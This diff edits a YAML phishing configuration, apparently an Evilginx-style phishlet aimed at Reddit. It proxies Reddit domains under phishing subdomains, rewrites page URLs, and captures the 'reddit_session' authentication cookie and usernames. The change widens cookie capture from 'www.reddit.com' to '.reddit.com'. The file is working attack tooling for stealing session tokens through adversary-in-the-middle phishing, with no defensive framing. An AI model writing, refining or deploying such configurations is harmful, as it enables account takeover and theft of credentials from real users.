@@ -1,6 +1,6 @@
 name: 'reddit'
 author: '@customsync'
-min_ver: '2.0.0'
+min_ver: '2.1.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'reddit.com', session: true, is_landing: true}
   - {phish_sub: 'win', orig_sub: 'www', domain: 'redditstatic.com', session: false, is_landing: false}
@@ -14,7 +14,7 @@ sub_filters:
   - {hostname: 'events.reddit.com', sub: 'www', domain: 'reddit.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {hostname: 'events.reddit.com', sub: 'www', domain: 'reddit.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
 auth_tokens:
-  - domain: 'www.reddit.com'
+  - domain: '.reddit.com'
     keys: ['reddit_session']
 user_regex:
   key: 'username'
